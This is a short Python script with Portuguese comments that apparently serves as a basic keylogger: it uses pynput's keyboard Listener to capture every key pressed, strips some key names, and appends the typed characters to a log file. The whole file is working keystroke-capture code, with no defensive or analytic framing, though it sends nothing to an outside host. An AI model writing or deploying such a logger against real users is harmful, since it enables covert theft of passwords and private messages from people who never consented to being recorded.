from pynput.keyboard import Listener # Importa a biblioteca Listener do pynput.keyboard para capturar as teclas pressionadas
import re # Importa a biblioteca re para usar expressões regulares

file_log = "" # Caminho do arquivo de log que armazenará as teclas capturadas
clean_chars = ["'", "Key.space", "Key.enter"] # Lista de caracteres que serão removidos das teclas capturadas

# Função que captura as teclas pressionadas pelo usuário e as processa
def capture(keycap):
    keycap = str(keycap).strip('()') # Remove os parênteses que envolvem as teclas capturadas
    for char in clean_chars:
        keycap = keycap.replace(char, '') # Remove os caracteres especificados na lista "clean_chars"
    keycap = re.sub(r'Key\..*', '', keycap) # Remove qualquer outro prefixo 'Key.' usando expressões regulares
    with open(file_log, "a") as log:
        log.write(keycap) # Escreve a tecla processada no arquivo de log

# Usa a função Listener para capturar as teclas pressionadas e chama a função "capture" para processá-las
with Listener(on_press=capture) as l:
    l.join() # Mantém o programa em execução até que seja interrompido manualmente
